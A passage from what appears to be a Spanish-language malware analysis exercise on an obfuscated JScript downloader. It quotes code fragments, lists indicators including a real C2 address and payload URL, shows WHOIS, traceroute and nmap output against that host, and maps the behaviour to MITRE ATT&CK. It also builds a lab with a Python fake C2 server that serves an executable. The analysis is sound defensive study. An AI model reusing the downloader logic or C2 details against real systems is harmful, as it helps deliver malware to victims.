    fso.DeleteFile(targetPath);

tmpFile.Close();
break;
```
donde:
- Intenta borrar el fichero del propio script (ScriptFullName).
- Espera un rato (Sleep).
- Borra tambi√©n el fichero descargado (targetPath), si existe.
- Cierra el tmpFile y hace break; para salir del bucle interno.

**Comportamiento:**
- Usa ShellExecute para arrancar el .exe descargado.
- Intenta borrar el script .js original y el .exe descargado para eliminar evidencias.

**Resultado final:** El script de JavaScript termina su trabajo y deja el control al nuevo ejecutable descargado que podr√≠a ser, un Ransomware, un troyano bancario o un software de espionaje.


### Si falla o no se ejecuta nada
```
} catch (e) {}

if (executed == true) {
    break;
}

WScriptObj.Sleep(10000 * 8);
```
donde:
- Si pasa una excepci√≥n en la descarga/escritura, se ignora.
- Si executed == true, sale del bucle interno.
- Si no se ha conseguido ejecutar el archivo:
  - espera unos segundos (Sleep(80000)),
  - y vuelve a intentar la descarga en el mismo while(true) interno.

## Extracci√≥n los IOCs

### Indicadores de Red - Network Indicators
**Investigamos un poco sobre esa IP:**
```shell
whois 217.28.218.217
% This is the RIPE Database query service.
% The objects are in RPSL format.
%
% The RIPE Database is subject to Terms and Conditions.
% See https://docs.db.ripe.net/terms-conditions.html

% Note: this output has been filtered.
%       To receive output for a database update, use the "-B" flag.

% Information related to '217.28.218.192 - 217.28.218.223'

% Abuse contact for '217.28.218.192 - 217.28.218.223' is 'abuse@domru.ru'

inetnum:        217.28.218.192 - 217.28.218.223
netname:        ARFU-NET
country:        RU
admin-c:        SM3227-RIPE
tech-c:         SK4292-RIPE
status:         ASSIGNED PA
mnt-by:         JSC-TELENET-MNT
created:        2017-07-05T07:15:06Z
last-modified:  2017-07-13T10:26:04Z
source:         RIPE

person:         Tech Admin Telenet
address:        14 build 3,
address:        Mazhorov Side Str.,
address:        Moscow, Russia, 105023
phone:          +7 495 7857100
fax-no:         +7 495 7772333
nic-hdl:        SK4292-RIPE
mnt-by:         JSC-TELENET-MNT
created:        2008-10-10T14:20:03Z
last-modified:  2018-11-27T12:11:36Z
source:         RIPE # Filtered

person:         Sergey Matral
address:        14 build 3, Mazhorov Side Str., Moscow, Russia, 107023
phone:          +7 495 7254112
nic-hdl:        SM3227-RIPE
mnt-by:         ru-okbprogress-1-mnt
created:        2002-08-26T10:23:12Z
last-modified:  2018-09-25T16:16:30Z
source:         RIPE # Filtered

% Information related to '217.28.216.0/22AS29053'

route:          217.28.216.0/22
descr:          Routing Block#2 Telenet (Moscow)
origin:         AS29053
mnt-by:         JSC-TELENET-MNT
created:        2007-11-20T13:07:11Z
last-modified:  2007-11-20T13:07:11Z
source:         RIPE

% Information related to '217.28.216.0/22AS31363'

route:          217.28.216.0/22
descr:          JSC "ER-Telecom Holding" Moscow branch
descr:          Moscow, Russia
origin:         AS31363
mnt-by:         RAID-MNT
created:        2022-11-24T05:32:24Z
last-modified:  2022-11-24T05:32:24Z
source:         RIPE

% This query was served by the RIPE Database Query Service version 1.120 (BUSA)
```
donde:
- La IP 217.28.218.217 est√° dentro del bloque 217.28.218.192/27 (192‚Äì223).
- country: RU ‚Üí el bloque est√° registrado en Rusia.
- netname: ARFU-NET ‚Üí nombre l√≥gico del bloque (suele ser un cliente o subred concreta).
- ASSIGNED PA ‚Üí es espacio ‚ÄúProvider Aggregatable‚Äù asignado por el proveedor, no un bloque independiente de un cliente grande.
- El bloque est√° gestionado por JSC Telenet / JSC "ER-Telecom Holding", un ISP ruso con sede en Mosc√∫.
- La direcci√≥n f√≠sica en el WHOIS corresponde a Mosc√∫.
- El contacto de abuso (a quien escribir si reportas actividad maliciosa) es: `abuse@domru.ru`
- No prueba que ahora mismo haya un host encendido en esa IP.
- La IP pertenece a un rango real,
- Est√° bajo la responsabilidad de el ISP ruso (JSC "ER-Telecom Holding", Mosc√∫).


**Resumiendo:** La IP 217.28.218.217 pertenece al rango 217.28.218.192‚Äì223 (netname ARFU-NET), registrado en Rusia y gestionado por el ISP JSC 'ER-Telecom Holding' (Mosc√∫).

**Probamos con VirusTotal a ver qu√© nos cuenta de esa IP:**

![virus-total](capturas/virus-total.png)


**Probamos con traceroute:**
```
traceroute 217.28.218.217
traceroute to 217.28.218.217 (217.28.218.217), 30 hops max, 60 byte packets
 1  _gateway (10.0.2.2)  0.678 ms  0.614 ms  0.589 ms
 2  192.168.144.1 (192.168.144.1)  5.019 ms  4.995 ms  4.967 ms
 3  * * *
 4  * * *
 5  10.255.180.78 (10.255.180.78)  8.534 ms  8.512 ms  8.487 ms
 6  10.34.205.1 (10.34.205.1)  22.311 ms  15.284 ms  15.257 ms
 7  10.34.206.57 (10.34.206.57)  17.951 ms 10.34.206.61 (10.34.206.61)  14.618 ms  14.589 ms
 8  193.251.247.13 (193.251.247.13)  18.637 ms  18.624 ms  18.613 ms
 9  193.251.150.76 (193.251.150.76)  18.602 ms 193.251.129.16 (193.251.129.16)  18.589 ms 193.251.150.76 (193.251.150.76)  20.323 ms
10  prs-bb2-link.ip.twelve99.net (62.115.123.220)  57.810 ms 193.251.150.76 (193.251.150.76)  20.295 ms prs-bb2-link.ip.twelve99.net (62.115.123.220)  82.849 ms
11  ffm-bb2-link.ip.twelve99.net (62.115.122.139)  46.710 ms  78.701 ms  78.665 ms
12  ffm-bb2-link.ip.twelve99.net (62.115.122.139)  78.649 ms sto-bb2-link.ip.twelve99.net (62.115.138.104)  78.618 ms  78.603 ms
13  mow-b5-link.ip.twelve99.net (62.115.141.23)  89.340 ms sto-bb2-link.ip.twelve99.net (62.115.138.104)  77.015 ms mow-b5-link.ip.twelve99.net (62.115.141.23)  88.528 ms
14  ertelekom-ic-393966.ip.twelve99-cust.net (213.248.90.211)  88.482 ms mow-b5-link.ip.twelve99.net (62.115.141.23)  88.455 ms  88.430 ms
15  ertelekom-ic-393965.ip.twelve99-cust.net (213.248.104.255)  90.609 ms  90.506 ms  89.663 ms
16  176x213x132x18.static-business.msk.ertelecom.ru (176.213.132.18)  85.236 ms * 176x213x132x30.static-business.msk.ertelecom.ru (176.213.132.30)  86.795 ms
17  * * *
18  * * *
19  * * *
20  * * *
21  * * *
```
donde:
- Saltos 1‚Äì2 (10.0.2.2, 192.168.144.1): 10.0.2.2 es la puerta de enlace predeterminada de VirtualBox. 192.168.144.1 es el router de mi red.
- Saltos 3‚Äì4: * * *: Routers intermedios que no responden a los mensajes ‚ÄúTTL exceeded‚Äù.
- Saltos 5‚Äì7 (10.255.x.x, 10.34.x.x): M√°s IPs privadas ‚Üí red interna del ISP (carrier-grade NAT, backbone interno).
- Hasta aqu√≠: simplemente estamos saliendo de mi red hacia el operador.
- Saltos 8‚Äì9 ‚Äì 193.251.x.x: Routers p√∫blicos de un backbone europeo.
- Saltos 10‚Äì13 ‚Äì *.ip.twelve99.net. Routers de Twelve99 (antes Telia), un operador Tier-1. Los nombres dan pistas:
  - prs-bb2 ‚Üí backbone en Par√≠s,
  - ffm-bb2 ‚Üí backbone en Fr√°ncfort,
  - sto-bb2 ‚Üí backbone en Estocolmo,
  - mow-b5 ‚Üí backbone en Mosc√∫.
- Hasta aqu√≠: mi tr√°fico est√° cruzando Europa hasta Mosc√∫.
- Saltos 14‚Äì15 ‚Äì ertelekom-ic-....twelve99-cust.net: Son los puntos de interconexi√≥n donde Twelve99 entrega el tr√°fico al cliente ER-Telecom (el mismo que te sal√≠a en el WHOIS).
- Salto 16 ‚Äì 176x213x132x18/30.static-business.msk.ertelecom.ru. Son routers dentro de la red de ER-Telecom en Mosc√∫ (msk).
- A partir de aqu√≠, estamos claramente dentro de la red del ISP ruso donde vive el rango 217.28.216.0/22 que incluye la IP.
- Saltos 17‚Äì21 ‚Äì * * *: Los paquetes llegan hasta el proveedor de internet en Mosc√∫, pero justo antes de llegar al servidor final (217.28.218.217), se pierden.

**<mark>Esa IP no responde a traceroute ni a ping.</mark>** El hecho de que muera despu√©s puede deberse a:
- Opci√≥n A: Hay un Firewall delante del servidor que bloquea todo el tr√°fico de diagn√≥stico (ICMP/UDP) para ocultarse.
- Opci√≥n B: El servidor ha sido desconectado ("Taken down") por el proveedor de internet debido a denuncias de abuso, pero la ruta hacia la red del proveedor sigue activa.


**Hacemos un escaneo ligero con nmap:**  
La opci√≥n -Pn indica que no conf√≠e en ping y pruebe directamente los puertos.
```
nmap -Pn -p 80,443,8080 217.28.218.217
Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-07 19:44 CET
Nmap scan report for 217x28x218x217.static-business.msk.ertelecom.ru (217.28.218.217)
Host is up.

PORT     STATE    SERVICE
80/tcp   filtered http
443/tcp  filtered https
8080/tcp filtered http-proxy

Nmap done: 1 IP address (1 host up) scanned in 3.03 seconds
usuario@usuario-1-2:~/Escritorio/M3-Ejercicio6$ 
```
donde:
- `Nmap scan report for 217x28x218x217.static-business.msk.ertelecom.ru`:
  - msk: Mosc√∫.
  - ertelecom: El ISP ruso.
  - static-business: Confirma que es una IP est√°tica empresarial, t√≠pica de servicios de hosting o VPS. No es la conexi√≥n dom√©stica, es infraestructura alquilada.
- El Estado de los Puertos: filtered. Silencio absoluto. Nmap envi√≥ paquetes solicitando entrar, pero nadie respondi√≥. Los paquetes fueron "tirados a la basura" (dropped). Esto indica la presencia de un Firewall intermedio o una regla de enrutamiento que est√° bloqueando todo el tr√°fico entrante hacia esa IP. <mark>No es que el servicio web est√© apagado (si fuera as√≠, dar√≠a closed), es que la "carretera" hacia ese servidor ha sido cortada</mark>.
- **</mark>Se bloquea TODO el tr√°fico TCP hacia los puertos de servicio.</mark>**


**Conclusi√≥n sobre la ip de este ejercicio**:  
Hay indicios de que la IP 217.28.218.217 corresponde a un host en una red activa (no es una IP hu√©rfana), pero los puertos t√≠picos de HTTP/HTTPS (80, 443, 8080) est√°n filtrados por un firewall. No se puede determinar si el servicio C2 sigue operativo en esos puertos, o si solo acepta conexiones en otras condiciones (otros puertos, reglas espec√≠ficas, horario, listas blancas, etc.).


**Resumen de IOCs de Red:**
| Tipo | Valor | Contexto / Descripci√≥n |
| -- | -- | -- |
| IP C2 | 217.28.218.217  | Direcci√≥n IP del Servidor de Comando y Control.|
| Alojamiento de la IP | ISP ruso (JSC "ER-Telecom Holding", Mosc√∫) |
| Contacto de abuso registrado | abuse@domru.ru |
| URL Completa  | https://217.28.218.217/NOPE/q64.php  | Ruta espec√≠fica donde se aloja el payload malicioso.|
| Par√°metro URL  | ?add=gtyhbncdfewpnjm9oklmnfdrtqdczdfgrt  | Cadena de consulta hardcodeada. Muy √∫til para reglas de detecci√≥n en Proxy/Firewall.|
| Protocolo  | HTTPS (Port 443)  | Usa SSL para ocultar el tr√°fico (Msxml2.ServerXMLHTTP).|



### Indicadores de Host - Host-based Indicators
Rastros f√≠sicos que deja el malware en el disco duro de la v√≠ctima.
| Tipo | Valor / Patr√≥n | Ubicaci√≥n | Descripci√≥n |
| -- | -- | -- | -- |
| Nombre de Archivo | flash_update.js | Carpeta de Inicio (Startup) | Nombre que usa para la persistencia. Intenta hacerse pasar por una actualizaci√≥n de Adobe Flash. |
| Patr√≥n de Archivo | "\d+.exe (Ej: 45.exe, 102.exe)" | %TEMP% | El payload descargado se guarda con un nombre num√©rico aleatorio en la carpeta temporal. |
| Firma M√°gica | MZ (0x4D 0x5A) | Cabecera del archivo | El script busca expl√≠citamente estos bytes al inicio del archivo descargado para confirmar que es un ejecutable. |


### IoC de contenido - cadenas - strings
Los IoC de Contenido (o String IoCs) son cadenas de texto espec√≠ficas dentro del cuerpo del malware que sirven como "huellas dactilares". 

| Cadena (String) | Descripci√≥n / Contexto |
| -- | -- |
| 217.28.218.217 | La IP del servidor C2. |
| /NOPE/q64.php | La ruta del recurso en el servidor. |
| gtyhbncdfewpnjm9oklmnfdrtqdczdfgrt | El IoC m√°s fuerte. Es el valor del par√°metro ?add=. Parece una clave de campa√±a o token √∫nico. |
| &uid= | El par√°metro que usa para enviar el identificador de la v√≠ctima. |
| "The document is corrupted and cannot be opened" |  El mensaje de error falso. |
| Msxml2.ServerXMLHTTP | Objeto usado para la descarga silenciosa. |
| ADODB.Stream | Objeto usado para escribir el archivo binario en disco. |
| Scripting.FileSystemObject | Objeto para manipular archivos (borrarse a s√≠ mismo). |
| WScript.Shell | Objeto para ejecutar comandos y leer variables de entorno. |
| MZ | "La ""firma m√°gica"" que busca el script para validar si descarg√≥ un ejecutable (.exe)." |

### Mapeo de las t√©cnicas observadas en el c√≥digo sobre la matriz MITRE ATT&CK Enterprise
#### T√°ctica: Execution - TA0002
El c√≥digo intenta ejecutar c√≥digo malicioso. T√©cnica: Command and Scripting Interpreter: JavaScript (T1059.007)
- Uso de objetos como ActiveXObject, WScript.Shell y la extensi√≥n .js confirman que este ataque depende del int√©rprete de scripts de Windows (wscript.exe o cscript.exe) para funcionar.


#### T√°ctica: Persistence - TA0003 
El c√≥digo intenta mantener su posici√≥n en el sistema tras un reinicio. T√©cnica: Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder (T1547.001)
- El script busca la carpeta especial n√∫mero 7 de Windows, que corresponde a la carpeta "Inicio" (Startup), y se copia all√≠.

#### T√°ctica: Defense Evasion - TA0005 
El c√≥digo intenta evitar ser detectado.
- T√©cnica: Virtualization/Sandbox Evasion: Time Based Evasion (T1497.003)
  - El bucle infinito que cuenta hasta 200 millones antes de ejecutar la descarga. Esto est√° dise√±ado para agotar el tiempo de an√°lisis de sandboxes gratuitas (como ANY.RUN).

- T√©cnica: Obfuscated Files or Information (T1027)
  - Todo el ejercicio de limpieza que se ha tenido que realizar para poder ver (y entender) algo en el c√≥digo.

 - T√©cnica: Indicator Removal on Host: File Deletion (T1070.004)
  - El script intenta borrarse a s√≠ mismo (ScriptFullName) y al ejecutable descargado despu√©s de lanzarlo para no dejar pistas forenses.

- T√©cnica: Masquerading (T1036)
  - Usa el nombre flash_update.js para parecer leg√≠timo en la carpeta de inicio.


#### T√°ctica: Command and Control - TA0011
El c√≥digo intenta comunicarse con sistemas bajo su control. T√©cnica: Application Layer Protocol: Web Protocols (T1071.001)
- Uso de peticiones HTTP/S est√°ndar para comunicarse con el servidor C2.

#### T√°ctica: Resource Development - TA0042 -  Command and Control
C√≥mo obtiene el c√≥digo sus herramientas.
- T√©cnica: Ingress Tool Transfer (T1105).
  - La descarga del archivo .exe desde una fuente externa para introducirlo en la red de la v√≠ctima.

#### Tabla res√∫men de t√©cnicas observadas sobre la matriz MITRE ATT&CK
| ID T√©cnica | Nombre de la T√©cnica | Evidencia Observada en el c√≥digo |
| -- | -- | -- |
| T1059.007 | Interpreter: JavaScript | Ejecuci√≥n v√≠a WScript/ActiveX. |
| T1547.001 | Startup Folder | Copia a Shell.NameSpace(7) como flash_update.js. |
| T1497.003 | Time Based Evasion | Bucle while masivo (Delay execution). |
| T1027 | Obfuscated Files | Strings rotos y Unicode (\u00XX). |
| T1070.004 | File Deletion | FSO.DeleteFile() post-ejecuci√≥n. |
| T1071.001 | Application Layer Protocol: Web Protocols  |  Uso del objeto Msxml2.ServerXMLHTTP |
| T1105 | Ingress Tool Transfer | Descarga de payload .exe desde IP remota. |
| T1036 | Masquerading | "Fake error message + nombre falso ""Flash Update""." |


## Laboratorio para probar este malware
Para que esto funcione, necesitamos enga√±ar al malware en tres niveles: Red (DNS/IP), Cifrado (SSL/HTTPS) y Aplicaci√≥n (La respuesta del servidor).

### Paso 1: Redirecci√≥n de DNS - El archivo Hosts 
El malware intenta conectar a 217.28.218.217. Como no queremos que salga a internet, debemos decirle a la m√°quina de laboratorio que esa IP somos nosotros mismos (Localhost).

Editamos el archivo C:\Windows\System32\drivers\etc\hosts con permisos de Administrador y a√±adimos l√≠nea al final:
```
127.0.0.1       217.28.218.217
```

### Paso 2: El Payload - Hello World 
El malware espera un ejecutable (.exe) v√°lido (que empiece por "MZ"). No podemos enviar un simple archivo de texto. Para ello, creamis un archivo llamado hola.c con el c√≥digo:
```c
#include <stdio.h>
#include <stdlib.h>

int main() {
    printf("\n[+] CONEXION EXITOSA: El malware ha ejecutado este payload.\n");
    printf("[+] HELLO WORLD desde el Laboratorio.\n");
    system("pause"); // Para que la ventana no se cierre inmediatamente
    return 0;
}
```

Lo compilamos usando: `gcc hola.c -o payload.exe`.

Ponemos el fichero .exe en la misma carpeta donde ejecutarmos el script de Python que har√° de listener en el servidor Linux.

### Paso 3: Certificado SSL Falso
El malware usa https://. Necesitamos un certificado para que el servidor Python pueda levantar el puerto 443 con SSL. Ejecutaremos este comando:
```bash
openssl req -new -x509 -keyout server.pem -out server.pem -days 365 -nodes
```
donde:
- guardamos server.pen en la misma carpeta donde estar√°n, payload.exe y c2_listener_server.py.
- 

### Paso 4: El Listener C2 en Python
Este script simula ser el servidor del atacante.
- Escucha en el puerto 443.
- Intercepta la petici√≥n a /NOPE/q64.php.
- Responde con c√≥digo 200 OK.
- Env√≠a el archivo payload.exe.

Documento c2_listener_server.py:
```Python
import http.server
import ssl
import os

# CONFIGURACI√ìN
PORT = 443
PAYLOAD_FILE = "payload.exe"
# La ruta que busca el malware (seg√∫n tu an√°lisis)
TARGET_PATH = "/NOPE/q64.php" 

class MalwareHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        # Imprimimos en consola quien se conecta
        print(f"\n[!] Petici√≥n recibida desde: {self.client_address[0]}")
        print(f"[!] Ruta solicitada: {self.path}")

        # Verificamos si la ruta contiene la parte cr√≠tica que busca el malware
        if TARGET_PATH in self.path:
            if os.path.exists(PAYLOAD_FILE):
                print(f"[+] Ruta correcta detectada. Enviando {PAYLOAD_FILE}...")
                
                # 1. Enviar c√≥digo 200 OK
                self.send_response(200)
                
                # 2. Enviar cabeceras necesarias
                # 'application/octet-stream' indica que es un archivo binario
                self.send_header("Content-type", "application/octet-stream")
                self.send_header("Content-Disposition", f'attachment; filename="{PAYLOAD_FILE}"')
                
                # Calculamos el tama√±o para la cabecera Content-Length
                fs = os.fstat(open(PAYLOAD_FILE, 'rb').fileno())
                self.send_header("Content-Length", str(fs.st_size))
                self.end_headers()

                # 3. Enviar el cuerpo del archivo (El ejecutable)
                with open(PAYLOAD_FILE, 'rb') as f:
                    self.wfile.write(f.read())
                
                print("[+] Payload enviado con √©xito.\n")
            else:
                print(f"[-] ERROR: No encuentro el archivo {PAYLOAD_FILE} en el directorio actual.")
                self.send_error(404, "Payload no encontrado en el servidor")
        else:
            # Si el malware pide otra cosa o la URL no coincide
            print("[-] Ruta desconocida o irrelevante. Ignorando.")
            self.send_error(404, "File Not Found")

    # Silenciar logs por defecto de http.server para que se vea m√°s limpio
    def log_message(self, format, *args):
        return

print(f"[*] Iniciando C2 Listener Falso en el puerto {PORT} (HTTPS)...")
print(f"[*] Esperando a la v√≠ctima en la ruta: {TARGET_PATH}")

# Configuraci√≥n del Socket con SSL
server_address = ('0.0.0.0', PORT)
httpd = http.server.HTTPServer(server_address, MalwareHandler)

# Envolvemos el socket con el certificado que generaste
context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
context.load_cert_chain(certfile='server.pem')
httpd.socket = context.wrap_socket(httpd.socket, server_side=True)

try:
    httpd.serve_forever()
except KeyboardInterrupt:
    print("\n[*] Servidor detenido.")
```

### C√≥mo ejecutar la prueba
- Nos Aseguramos de tener los 3 archivos en la misma carpeta: c2_server.py, payload.exe y server.pem.
- Abrimos una terminal como Administrador (necesario para escuchar en el puerto 443).
- Ejecutamos: python c2_server.py.
- En otra terminal (o haciendo doble clic), ejecuta el script desofuscado del malware (ejercicio6.js).

### Lo que deber√≠a pasar:
- El malware "dormir√°" (si no quitaste el bucle de retardo, el while largo). Recomendaci√≥n: Cambia el 200000000 por 10 en el JS para no esperar.
- El malware conectar√° a tu Python.
- El Python dir√° [+] Ruta correcta detectada. Enviando payload.exe....
- El malware recibir√° el archivo, ver√° que empieza por "MZ", y lo ejecutar√°.
- Se abrir√° una ventana negra diciendo: "[+] HELLO WORLD desde el Laboratorio".

